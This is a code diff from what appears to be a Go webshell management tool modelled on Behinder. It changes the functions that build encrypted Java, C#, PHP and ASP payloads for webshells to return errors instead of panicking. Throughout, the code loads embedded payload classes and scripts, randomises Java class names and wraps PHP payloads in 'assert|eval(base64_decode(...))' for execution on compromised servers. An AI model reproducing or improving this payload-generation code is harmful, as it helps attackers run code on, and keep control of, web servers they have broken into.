@@ -14,8 +14,12 @@ import (
 
 func GetPayload(key []byte, className string, params map[string]string, types shell.ScriptType, encryptType int) ([]byte, error) {
 	var bincls []byte
+	var err error
 	if types == shell.JavaScript {
-		bincls = getParamedClass(className, params)
+		bincls, err = getParamedClass(className, params)
+		if err != nil {
+			return nil, err
+		}
 		//if (extraData != null) {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
@@ -25,7 +29,10 @@ func GetPayload(key []byte, className string, params map[string]string, types sh
 		}
 		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
 	} else if types == shell.PhpScript {
-		bincls = getParamedPhp(className, params)
+		bincls, err = getParamedPhp(className, params)
+		if err != nil {
+			return nil, err
+		}
 		bincls = []byte(base64.StdEncoding.EncodeToString(bincls))
 		//bincls = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
 		bincls = []byte(("assert|eval(base64_decode('" + string(bincls) + "'));"))
@@ -38,7 +45,10 @@ func GetPayload(key []byte, className string, params map[string]string, types sh
 		}
 		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
 	} else if types == shell.CsharpScript {
-		bincls = GetParamedAssembly(className, params)
+		bincls, err = GetParamedAssembly(className, params)
+		if err != nil {
+			return nil, err
+		}
 		//if (extraData != null) {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
@@ -48,11 +58,13 @@ func GetPayload(key []byte, className string, params map[string]string, types sh
 		}
 		return encrypedBincls, nil
 	} else if types == shell.AspScript {
-		bincls = GetParamedAsp(className, params)
+		bincls, err = GetParamedAsp(className, params)
+		if err != nil {
+			return nil, err
+		}
 		//if (extraData != null) {
 		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
 		//}
-		//fmt.Println(hex.EncodeToString(encryptForAsp(bincls, key)))
 		xx := encryptForAsp(bincls, key)
 		return xx, nil
 	} else {
@@ -60,15 +72,18 @@ func GetPayload(key []byte, className string, params map[string]string, types sh
 	}
 }
 
-func getParamedClass(clsName string, params map[string]string) []byte {
+func getParamedClass(clsName string, params map[string]string) ([]byte, error) {
 	payloadBytes, err := payloads.BehinderClassPayloads.ReadFile(fmt.Sprintf("behinder/java/%s.class", clsName))
 	if err != nil {
-		panic(err)
+		return nil, err
 	}
 	for k, v := range params {
 		payloadBytes, _ = dynamic.ReplaceClassStrVar(payloadBytes, k, v)
 	}
 	result := payloadBytes
+	if len(result) == 0 {
+		return nil, errors.New("payload is empty")
+	}
 	oldClassName := fmt.Sprintf("net/behinder/payload/java/%s", clsName)
 	if clsName != "LoadNativeLibraryGo" {
 		newClassName := dynamic.RandomClassName()
@@ -76,7 +91,7 @@ func getParamedClass(clsName string, params map[string]string) []byte {
 	}
 	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行，不知道有没有 bug
 	result[7] = 49
-	return result
+	return result, nil
 }
 
 func keySet(m map[string]string) []string {
@@ -90,11 +105,11 @@ func keySet(m map[string]string) []string {
 	return keys
 }
 
-func getParamedPhp(clsName string, params map[string]string) []byte {
+func getParamedPhp(clsName string, params map[string]string) ([]byte, error) {
 	var code strings.Builder
 	payloadBytes, err := payloads.BehinderPhpPayloads.ReadFile(fmt.Sprintf("behinder/php/%s.php.txt", clsName))
 	if err != nil {
-		panic(err)
+		return nil, err
 	}
 	code.WriteString(string(payloadBytes))
 	paraList := ""
@@ -113,7 +128,7 @@ func getParamedPhp(clsName string, params map[string]string) []byte {
 
 	paraList = strings.Replace(paraList, ",", "", 1)
 	code.WriteString("\r\nmain(" + paraList + ");")
-	return []byte(code.String())
+	return []byte(code.String()), nil
 }
 
 // 获取 php 代码中需要更改的 params
@@ -137,13 +152,13 @@ func getPhpParams(phpPayload []byte) []string {
 	return paramList
 }
 
-func GetParamedAssembly(clsName string, params map[string]string) []byte {
+func GetParamedAssembly(clsName string, params map[string]string) ([]byte, error) {
 	payloadBytes, err := payloads.BehinderCsharpPayloads.ReadFile(fmt.Sprintf("behinder/csharp/%s.dll", clsName))
 	if err != nil {
-		panic(err)
+		return nil, err
 	}
 	if len(keySet(params)) == 0 {
-		return payloadBytes
+		return payloadBytes, nil
 	} else {
 		paramsStr := ""
 		var paramName, paramValue string
@@ -154,15 +169,15 @@ func GetParamedAssembly(clsName string, params map[string]string) []byte {
 		}
 		paramsStr = paramsStr[0 : len(paramsStr)-1]
 		token := "~~~~~~" + paramsStr
-		return dynamic.MergeBytes(payloadBytes, []byte(token))
+		return dynamic.MergeBytes(payloadBytes, []byte(token)), nil
 	}
 }
 
-func GetParamedAsp(clsName string, params map[string]string) []byte {
+func GetParamedAsp(clsName string, params map[string]string) ([]byte, error) {
 	var code strings.Builder
 	payloadBytes, err := payloads.BehinderAspPayloads.ReadFile(fmt.Sprintf("behinder/asp/%s.asp.txt", clsName))
 	if err != nil {
-		panic(err)
+		return nil, err
 	}
 	code.WriteString(string(payloadBytes))
 	paraList := ""
@@ -182,5 +197,5 @@ func GetParamedAsp(clsName string, params map[string]string) []byte {
 	}
 	paraList = strings.Replace(paraList, ",", "", 1)
 	code.WriteString("\r\nmain " + paraList + "")
-	return []byte(code.String())
+	return []byte(code.String()), nil
 }
